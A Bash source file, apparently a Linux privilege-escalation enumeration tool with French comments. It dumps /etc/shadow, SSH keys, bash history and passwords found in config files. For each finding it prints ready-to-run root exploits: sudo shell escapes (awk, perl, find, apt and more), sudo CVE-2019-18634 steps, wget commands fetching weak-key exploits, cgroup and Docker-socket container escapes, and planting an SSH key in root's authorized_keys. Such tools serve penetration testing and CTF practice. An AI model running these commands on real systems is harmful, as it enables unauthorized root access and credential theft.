#!/bin/bash

# Ansi color code variables
red="\e[0;91m"
blue="\e[0;94m"
expand_bg="\e[K"
blue_bg="\e[0;104m${expand_bg}"
red_bg="\e[0;101m${expand_bg}"
green_bg="\e[0;102m${expand_bg}"
green="\e[0;92m"
white="\e[0;97m"
bold="\e[1m"
uline="\e[4m"
reset="\e[0m"




echo -e "${blue}      ____       _                       _     _                   ${reset}"
echo -e "${blue}     |  _ \ _ __(_)_   _____  ___  ___  | |   (_)_ __  _   ___  __ ${reset}"
echo -e "${blue}     | |_) | '__| \ \ / / _ \/ __|/ __| | |   | | '_ \| | | \ \/ / ${reset}"
echo -e "${blue}     |  __/| |  | |\ V /  __/\__ \ (__  | |___| | | | | |_| |>  <  ${reset}"
echo -e "${blue}     |_|   |_|  |_| \_/ \___||___/\___| |_____|_|_| |_|\__,_/_/\_\ ${reset}"
echo -e "${green}                                                                   ${reset}"
echo -e "${green}      ____          ____                 _____                     ${reset}"
echo -e "${green}     | __ ) _   _  |  _ \ _ __ ___   ___|___ / ___ ___  ___  _ __  ${reset}"
echo -e "${green}     |  _ \| | | | | |_) | '__/ _ \ / __| |_ \/ __/ __|/ _ \| '__| ${reset}"
echo -e "${green}     | |_) | |_| | |  __/| | | (_) | (__ ___) \__ \__ \ (_) | |    ${reset}"
echo -e "${green}     |____/ \__, | |_|   |_|  \___/ \___|____/|___/___/\___/|_|    ${reset}"
echo -e "${green}            |___/                                                  ${reset}"
echo -e "${green}                                                                   ${reset}"
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Version du kernel                                 #${reset}"
echo -e "${blue}###################################################${reset}"
kernel=`uname -a`
echo  "$kernel"
echo "Find kernel exploits in : https://github.com/lucyoa/kernel-exploits"
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Process list                                      #${reset}"
echo -e "${blue}###################################################${reset}"
ps aux
psaux=`ps aux | grep screen`
if [[ $psaux = ''  ]]
then
    echo "No screen on the system"
else
    echo -e "${red}Screen detected : /usr/bin/screen -x <screen> (ex <screen> : root/root)'${reset}"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}User                                              #${reset}"
echo -e "${blue}###################################################${reset}"
id=`id`
echo -e "$id"
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Sudo perms                                        #${reset}"
echo -e "${blue}###################################################${reset}"
sudo -l
findsudo=`sudo -l | grep reported`
if [[ $findsudo = ''  ]]
then
	findawk=`which awk`
	findvim=`which vim`
	findperl=`which perl`
	findpython=`which python`
	findless=`which less`
	findman=`which man`
	findvi=`which vi`
	findapache2=`which apache2`
	findchroot=`which chroot`
	findfind=`which find`
	findgcc=`which gcc`
	findansible=`which ansible-playbook`
	findaptget=` which apt-get`
	findapt=`which apt`
	findar=`which ar`
	finaria2c=`which aria2c`
	findarj=`which arj`
	findarp=`which arp`
	findash=`which ash`
	findat=`which at`
	findatobm=`which atobm`
	findbase32=`which base32`
	findbase64=`which base64`
	findbasenc=`which basenc`
	findbash=`which ash`
	findas=`which as`
	if [[ $findawk != ''  ]]
	then
                echo "-----------------------------------------------------------"
		echo -e "${red}For awk execute command : sudo awk 'BEGIN {system(\"/bin/bash\")}'${reset}"
                echo "-----------------------------------------------------------"
	else
                echo "-----------------------------------------------------------"
		echo "No awk binary"
                echo "-----------------------------------------------------------"
	fi
        if [[ $findvim != ''  ]]
        then
                echo -e "${red}For vim execute command : sudo vim-c ':!/bin/sh'${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No vim binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findperl != ''  ]]
        then
                echo -e "${red}For perl execute command : sudo perl -e 'exec \"/bin/bash\";'${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No perl binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findpython != ''  ]]
        then
                echo -e "${red}For python execute command : sudo python -c 'import pty;pty.spawn(\"/bin/bash\")'${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No python binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findless != ''  ]]
        then
                echo -e "${red}For less execute command 1 : sudo less /etc/hosts${reset}"
		echo -e "${red}In /etc/hosts type : !bash${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No less binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findman != ''  ]]
        then
                echo -e "${red}For man execute command 1 : sudo man man${reset}"
                echo -e "${red}Type : !bash${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No man binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findvi != ''  ]]
        then
                echo -e "${red}For vi execute command 1 : sudo vi${reset}"
                echo -e "${red}Type : !bash${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No vi binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findapache2 != ''  ]]
        then
                echo -e "${red}For apache2 execute command : sudo apache2 -f /etc/shadow${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No apache2 binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findchroot != ''  ]]
        then
                echo -e "${red}For chroot execute command : sudo chroot /${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No chroot binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findfind != ''  ]]
        then
                echo -e "${red}For find execute command : sudo find . -exec /bin/sh \; -quit${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No find binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findgcc != ''  ]]
        then
                echo -e "${red}For gcc execute command : sudo gcc -wrapper /bin/sh,-s .${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No gcc binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findansible != ''  ]]
        then
                echo -e "${red}For ansible execute command 1 : TF=\$(mktemp)${reset}"
                echo -e "${red}For ansible execute command 2 : echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}' > \$TF${reset}"
                echo -e "${red}For ansible execute command 3 : sudo ansible-playbook $TF${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No ansible binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findaptget != ''  ]]
        then
                echo -e "${red}For apt-get execute command 1 : sudo apt-get changelog apt${reset}"
                echo -e "${red}For apt-get execute command 2 : !/bin/sh${reset}"
                echo -e "${red}If last comman don't work, execute command 1 : TF=\$(mktemp)${reset}"
                echo -e "${red}If last comman don't work, execute command 2 : echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > \$TF${reset}"
                echo -e "${red}If last comman don't work, execute command 3 : sudo apt-get install -c \$TF sl${reset}"
                echo -e "${red}Other technique, execute command : sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No apt-get binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findapt != ''  ]]
        then
                echo -e "${red}For apt execute command 1 : sudo apt changelog apt${reset}"
                echo -e "${red}For apt execute command 2 : !/bin/sh${reset}"
                echo -e "${red}If last comman don't work, execute command 1 : TF=\$(mktemp)"
                echo -e "${red}If last comman don't work, execute command 2 : echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > \$TF${reset}"
                echo -e "${red}If last comman don't work, execute command 3 : sudo apt install -c \$TF sl${reset}"
                echo -e "${red}Other technique, execute command : sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No apt binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findar != ''  ]]
        then
                echo -e "${red}For ar execute command 1 : TF=\$(mktemp -u)${reset}"
                echo -e "${red}For ar execute command 2 : LFILE=<file_to_read>${reset}"
                echo -e "${red}For ar execute command 3 : sudo ar r \"\$TF\" \"\$LFILE\"${reset}"
                echo -e "${red}For ar execute command 4 : cat \"\$TF\"${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No ar binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $finaria2c != ''  ]]
        then
                echo -e "${red}For aria2c execute command 1 : COMMAND='id'${reset}"
                echo -e "${red}For aria2c execute command 2 : TF=\$(mktemp)"
                echo -e "${red}For aria2c execute command 3 : echo \"\$COMMAND\" > \$TF${reset}"
                echo -e "${red}For aria2c execute command 4 : chmod +x \$TF${reset}"
                echo -e "${red}For aria2c execute command 5 : sudo aria2c --on-download-error=\$TF http://x${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No aria2c binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findarj != ''  ]]
        then
                echo -e "${red}For arj execute command 1 : TF=\$(mktemp -d)${reset}"
                echo -e "${red}For arj execute command 2 : LFILE=<file_to_write>${reset}"
                echo -e "${red}For arj execute command 3 : LDIR=<where_to_write>${reset}"
                echo -e "${red}For arj execute command 4 : echo DATA > \"\$TF/\$LFILE\"${reset}"
                echo -e "${red}For arj execute command 5 : arj a \"\$TF/a\" \"\$TF/\$LFILE\"${reset}"
                echo -e "${red}For arj execute command 6 : sudo arj e \"\$TF/a\" \$LDIR${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No arj binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findarp != ''  ]]
        then
                echo -e "${red}For arp execute command 1 : LFILE=<file_to_read>${reset}"
                echo -e "${red}For arp execute command 2 : sudo arp -v -f \"\$LFILE\"${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No arp binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findas != ''  ]]
        then
                echo -e "${red}For as execute command 1 : LFILE=<file_to_read>${reset}"
                echo -e "${red}For as execute command 2 : sudo as @\$LFILE${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No as binary"
                echo "-----------------------------------------------------------"
        fi
        if [[ $findash != ''  ]]
        then
                echo -e "${red}For ash execute command : sudo ash${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No ash binary"
                echo "-----------------------------------------------------------"
        fi

        if [[ $findat != ''  ]]
        then
                echo -e "${red}For at execute command : echo \"/bin/sh <\$(tty) >\$(tty) 2>\$(tty)\" | sudo at now; tail -f /dev/null${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No at binary"
                echo "-----------------------------------------------------------"
        fi

        if [[ $findatobm != ''  ]]
        then
                echo -e "${red}For atobm execute command 1 : LFILE=<file_to_read>${reset}"
                echo -e "${red}For atobm execute command 2 : sudo atobm \$LFILE 2>&1 | awk -F \"'\" '{print \"%s\", \$2}'${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No atobm binary"
                echo "-----------------------------------------------------------"
        fi

        if [[ $findbase32 != ''  ]]
        then
                echo -e "${red}For base32 execute command 1 : LFILE=<file_to_read>${reset}"
                echo -e "${red}For base32 execute command 2 : sudo base32 \"\$LFILE\" | base32 --decode${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No base32 binary"
                echo "-----------------------------------------------------------"
        fi

        if [[ $findbase64 != ''  ]]
        then
                echo -e "${red}For base64 execute command 1 : LFILE=<file_to_read>${reset}"
                echo -e "${red}For base64 execute command 2 : sudo base64 \"\$LFILE\" | base64 --decode${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No base64 binary"
                echo "-----------------------------------------------------------"
        fi

        if [[ $findbasenc != ''  ]]
        then
                echo -e "${red}For basenc execute command 1 : LFILE=<file_to_read>${reset}"
                echo -e "${red}For basenc execute command 2 : sudo basenc --base64 $LFILE | basenc -d --base64${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No basenc binary"
                echo "-----------------------------------------------------------"
        fi

        if [[ $findbash != ''  ]]
        then
                echo -e "${red}For bash execute command : sudo bash${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No bash binary"
                echo "-----------------------------------------------------------"
        fi
else
    	echo "No sudo binary to exploit"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Sudo version                                      #${reset}"
echo -e "${blue}###################################################${reset}"
sudo -V | head -n 1
exploitversionsudo1="1826"
sudoversion=`sudo -V | head -n 1 | awk '{print $4}' | tr -d .`
intsudoversion=$(($sudoversion))
intexploitversionsudo1=$(($exploitversionsudo1))
if [[ $intexploitversionsudo1 -gt $intsudoversion ]]
then
    echo -e "${red}Create file with this code inside : https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c${reset}"
	echo -e "${red}Compile : gcc exploit.c -o exploit${reset}"
	echo -e "${red}Execute : ./exploit${reset}"
else
        echo "No exploit for sudo version < 1.8.26"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}/etc/passwd                                       #${reset}"
echo -e "${blue}###################################################${reset}"
cat /etc/passwd
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}/etc/shadow                                       #${reset}"
echo -e "${blue}###################################################${reset}"
shadow=`cat /etc/shadow`
echo -e "${red}$shadow${reset}"
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Bash_history                                      #${reset}"
echo -e "${blue}###################################################${reset}"
cat ~/.bash_history
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}IP                                                #${reset}"
echo -e "${blue}###################################################${reset}"
ip a
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}ARP discover                                      #${reset}"
echo -e "${blue}###################################################${reset}"
arp -a
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Open ports                                        #${reset}"
echo -e "${blue}###################################################${reset}"
netstat -ano
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Locate each file with string \"password\" for name #${reset}"
echo -e "${blue}###################################################${reset}"
locate password
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}SSH keys                                          #${reset}"
echo -e "${blue}###################################################${reset}"
findssh1=`find / -name authorized_keys 2> /dev/null`
findssh2=`find / -name id_rsa 2> /dev/null`
if [[ $findssh1 || $findssh2 = true  ]]
then
	echo -e "${red}$findssh1${reset}"
	echo -e "${red}$findssh2${reset}"
else
	echo "No SSH keys"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}SSH weak keys                                     #${reset}"
echo -e "${blue}###################################################${reset}"
opensslv=`openssl version | cut -c9- | cut -f1 -d" " | cut -c 1-5 | tr -d .`
opensslv1="98"
intopensslv=$(($opensslv))
intopensslv1=$(($opensslv1))
if [[ $intopensslv1 -gt $intopensslv ]]
then
        echo -e "${red}Local : wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2${reset}"
        echo -e "${red}Local : tar jxvf ./5622.tar.bz2${reset}"
        echo -e "${red}Local : wget https://www.exploit-db.com/exploits/5720/5720.py${reset}"
        echo -e "${red}Local : python 5720.py rsa/2048/ <ip-target> root${reset}"
        echo -e "${red}Local : On suit ce que dit le script (il peut prendre du temps)${reset}"
else
        echo "No SSH weak keys"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}OVPN files                                        #${reset}"
echo -e "${blue}###################################################${reset}"
findovpn=`find / -name "*ovpn 2>/dev/null`
if [[ $findovpn = true  ]]
then
        echo -e "${red}$findovpn${reset}"
else
        echo "No ovpn files"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Others passwords                                  #${reset}"
echo -e "${blue}###################################################${reset}"
otherpassword=`find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`
echo -e "${red}$otherpassword${reset}"
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}SUID                                              #${reset}"
echo -e "${blue}###################################################${reset}"
suid=`find / -type f -perm -06000 -ls 2>/dev/null`
echo -e "${red}$suid${reset}"
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Capabilities                                      #${reset}"
echo -e "${blue}###################################################${reset}"
getcap -r / 2>/dev/null
findcaptar=`getcap / -r 2>/dev/null | awk '{print $1}' | grep tar`
findcapopenssl=`getcap / -r 2>/dev/null | awk '{print $1}' | grep openssl`
findcappython=`getcap / -r 2>/dev/null | awk '{print $1}' | grep python`
findcapperl=`getcap / -r 2>/dev/null | awk '{print $1}' | grep perl`
if [[ $findcaptar = true  ]]
then
        echo -e "${red}Execute command 1 : tar -cvf shadow.tar /etc/shadow${reset}"
	echo -e "${red}Execute command 2 : tar -xvf shadow.tar${reset}"
	echo -e "${red}Execute command 3 : cat etc/shadow${reset}"
else
        echo "No tar capabilities"
fi
if [[ $findcapopenssl = true  ]]
then
        echo -e "${red}Execute command 1 : openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes${reset}"
	echo -e "${red}Execute command 2 : openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP${reset}"
	echo -e "${red}Open a second bash tab and execute : curl -k \"https://127.0.0.1:1337/etc/shadow\"${reset}"
else
        echo "No openssl capabilities"
fi
if [[ $findcappython = true  ]]
then
        echo -e "${red}Execute command : $findcappython -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'${reset}"
else
        echo "No python capabilities"
fi
if [[ $findcapperl = true  ]]
then
        echo -e "${red}Execute command : /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'${reset}"
else
        echo "No perl capabilities"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Crontab find PATH                                 #${reset}"
echo -e "${blue}###################################################${reset}"
cat /etc/crontab
crontab -l
findcron=`cat /etc/crontab | grep root | grep -oE '(\/.+?) ' | cut -f1 -d" " | sed -z 's/\/\n//g'`
findcronpath=`cat /etc/crontab | grep PATH`
if [[ $findcronpath = true  ]]
then
	echo "If a script is execute with no complet path (ex: \"/etc/scripts/script.sh\" but \"script.sh\", check \$PATH. If the script is not in the first folder of \$PATH, create a malicious script in this folder :"
	echo "'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <first_folder_of_\$PATH/overwrite.sh"
else
        echo "No PATH in crontab"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}/etc/groups                                       #${reset}"
echo -e "${blue}###################################################${reset}"
cat /etc/group
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Docker                                            #${reset}"
echo -e "${blue}###################################################${reset}"
findsudoingroups=`groups | grep docker`
if [[ $findsudoingroups = true  ]]
then
	echo -e "${red}Execute command : docker run -v /:/mnt --rm -it bash chroot /mnt sh${reset}"
else
	echo "You are not in docker groups"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Conf /etc                                         #${reset}"
echo -e "${blue}###################################################${reset}"
ls -ls /etc/ | grep .conf
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Filesystems                                        #${reset}"
echo -e "${blue}###################################################${reset}"
cat /etc/fstab
mount -l
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}World writable directories                        #${reset}"
echo -e "${blue}###################################################${reset}"
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}World writable files                              #${reset}"
echo -e "${blue}###################################################${reset}"
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
echo ""
findworldsh=`find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null | grep sh`
if [[ $findworldsh = ''  ]]
then
        echo "No bash scripts"
else
        echo -e "${red}Local : ssh-keygen${reset}"
        echo -e "${red}Local : copy /<user>/.ssh/id_rsa.pub ${reset}"
        echo -e "${red}Target : echo \"echo '<ssh_key>' >> /root/.ssh/authorized_keys\" >> </path/to/sh/script> ${reset}"
        echo -e "${red}Target : </path/to/sh/script> ${reset}"
        echo -e "${red}Local : ssh -i id_rsa root@<ip-target> ${reset}"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}NFS                                               #${reset}"
echo -e "${blue}###################################################${reset}"
showmount -e 127.0.0.1
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}IptableS                                          #${reset}"
echo -e "${blue}###################################################${reset}"
iptables -L
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}WP database                                       #${reset}"
echo -e "${blue}###################################################${reset}"
wpbdd=`find /var/www -name "wp-config.php" 2>/dev/null`
if [[ $wpbdd = true  ]]
then
        echo -e "${red}Wordpress database find : $wpbdd ${reset}"
else
        echo "No wordpress database"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Mattermost                                        #${reset}"
echo -e "${blue}###################################################${reset}"
mattconf=`find /opt/mattermost/config -name "*json" 2>/dev/null`
mattconf2=`for dirname in $mattconf; do cat $dirname | grep DataSource; done`
if [[ $mattconf2 = ''  ]]
then
        echo "No Mattermost config file"
else
        echo -e "${red}Mattermost credentials : $mattconf2 ${reset}"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Backups shadow/passwd                             #${reset}"
echo -e "${blue}###################################################${reset}"
ls /var/backups
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Docker-compose                                    #${reset}"
echo -e "${blue}###################################################${reset}"
find / -name "docker-compose.yml" 2>/dev/null
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Partitions                                        #${reset}"
echo -e "${blue}###################################################${reset}"
/bin/lsblk
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Kernel modules                                    #${reset}"
echo -e "${blue}###################################################${reset}"
lsmod
echo "For more informations about kernel module, type : /sbin/modinfo <module>"
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Auth.log                                          #${reset}"
echo -e "${blue}###################################################${reset}"
lsmod
echo "cat /var/log/auth.log"
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Git password                                      #${reset}"
echo -e "${blue}###################################################${reset}"
findgit=`find / -name "gitlab.rb" 2>/dev/null`
findgit2=`for dirname in $findgit; do cat $dirname | grep pass; done`
if [[ $findgit2 = ''  ]]
then
        echo "No Git password"
else
        echo -e "${red}Git passwords : $findgit2 ${reset}"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Git folder                                        #${reset}"
echo -e "${blue}###################################################${reset}"
findgitfolder=`find / -name ".git" 2>/dev/null`
if [[ $findgitfolder = ''  ]]
then
        echo "No Git folder"
else
        echo -e "${red}Git folders : $findgitfolder ${reset}"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Docker escape                                     #${reset}"
echo -e "${blue}###################################################${reset}"
finddocker=`cat /proc/1/cgroup | grep docker`
if [[ $finddocker = ''  ]]
then
        echo "You are not in container"
else
        capchown=`capsh --print | grep cap_chown`
        capdacoverride=`capsh --print | grep cap_dac_override`
        capdacreadsearch=`capsh --print | grep cap_dac_read_search`
        capfowner=`capsh --print | grep cap_fowner`
        capfsetid=`capsh --print | grep cap_fsetid`
        capkill=`capsh --print | grep cap_kill`
        capsetgid=`capsh --print | grep cap_setgid`
        capsetuid=`capsh --print | grep cap_setuid`
        capsetpcap=`capsh --print | grep cap_setpcap`
        caplinuximmutable=`capsh --print | grep cap_linux_immutable`
        capnetbindservice=`capsh --print | grep cap_net_bind_service`
        capnetbroadcast=`capsh --print | grep cap_net_broadcast`
        capnetadmin=`capsh --print | grep cap_net_admin`
        capnetraw=`capsh --print | grep cap_net_raw`
        capipclock=`capsh --print | grep cap_ipc_lock`
        capipcowner=`capsh --print | grep cap_ipc_owner`
        capsysmodule=`capsh --print | grep cap_sys_module`
        capsysrawio=`capsh --print | grep cap_sys_rawio`
        capsyschroot=`capsh --print | grep cap_sys_chroot`
        capsysptrace=`capsh --print | grep cap_sys_ptrace`
        capsyspacct=`capsh --print | grep cap_sys_pacct`
        capsysadmin=`capsh --print | grep cap_sys_admin`
        capsysboot=`capsh --print | grep cap_sys_boot`
        capsysnice=`capsh --print | grep cap_sys_nice`
        capsysresource=`capsh --print | grep cap_sys_resource`
        capsystime=`capsh --print | grep cap_sys_time`
        capsysttyconfig=`capsh --print | grep cap_sys_tty_config`
        capmknod=`capsh --print | grep cap_mknod`
        caplease=`capsh --print | grep cap_lease`
        capauditwrite=`capsh --print | grep cap_audit_write`
        capauditcontrol=`capsh --print | grep cap_audit_control`
        capsetfcap=`capsh --print | grep cap_setfcap`
        capmacoverride=`capsh --print | grep cap_mac_override`
        capmacadmin=`capsh --print | grep cap_mac_admin`
        capsyslog=`capsh --print | grep cap_syslog`
        capwakealarm=`capsh --print | grep cap_wake_alarm`
        capblocksuspend=`capsh --print | grep cap_block_suspend`
        capauditread=`capsh --print | grep cap_audit_read`
        if [[ $capsysadmin != ''  ]]
        then
                echo -e "${red}mkdir /tmp/cgrp${reset}"
                echo -e "${red}mount -t cgroup -o rdma cgroup /tmp/cgrp${reset}"
                echo -e "${red}mkdir /tmp/cgrp/x${reset}"
                echo -e "${red}echo 1 > /tmp/cgrp/x/notify_on_release${reset}"
                echo -e "${red}host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`${reset}"
                echo -e "${red}echo \"$host_path/cmd\" > /tmp/cgrp/release_agent${reset}"
                echo -e "${red}echo '#!/bin/sh' > /cmd${reset}"
                echo -e "${red}echo \"ps aux > $host_path/output\" >> /cmd${reset}"
                echo -e "${red}chmod a+x /cmd${reset}"
                echo -e "${red}sh -c \"echo \$\$ > /tmp/cgrp/x/cgroup.procs\"${reset}"
                echo -e "${red}cat /output${reset}"
                echo "-----------------------------------------------------------"
        else
                echo "No cap_chown privesc"
                echo "-----------------------------------------------------------"
        fi
        echo ""
        echo "Escape par socket docker"
        echo -e "${red}Création d un conteneur via la socket hôte : curl -XPOST -H \"Content-Type: application/json\" --unix -socket /var/run/docker.sock -d \'{\"Image\":\"ubuntu:latest\",\" Cmd\":[\"cat\", \"/host/etc/shadow\"],\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/host\"}]}\' \"http://localhost/containers/create?name=escape\"${reset}"
        echo -e "${red}On lance le conteneur : curl -XPOST --unix-socket /var/run/docker.sock \"http://localhost/containers/escape/start\"${reset}"
        echo -e "${red}On regarde les logs et on trove /etc/passwd host : curl --output - --unix-socket /var/run/docker.sock \"http://localhost/containers/escape/logs?stdout=true\"${reset}"
        echo -e "${red}On supprime : curl -XDELETE --unix-socket /var/run/docker.sock \"http://localhost/containers/escape\"${reset}"
        echo ""
        echo "Lire les donées sensibles d'un autre conteneur'"
        echo -e "${red}cat /output${reset}"
        echo -e "${red}apt update${reset}"
        echo -e "${red}apt install curl jq${reset}"
        echo -e "${red}curl --unix-socket /var/run/docker.sock -H 'ContentType: application/json' "http://localhost/containers/database/json" | jq${reset}"
fi
echo ""
echo -e "${blue}###################################################${reset}"
echo -e "${blue}Find each string \"password\"                      #${reset}"
echo -e "${blue}Output in password.txt                            #${reset}"
echo -e "${blue}###################################################${reset}"
echo "Launch password research (yes/no)?"
read input1
if [[ $input1 = "yes"  ]]
then
	echo "Start password research ..."
	grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null > passwords.txt
else
        echo "This step is skipped"
fi
echo ""
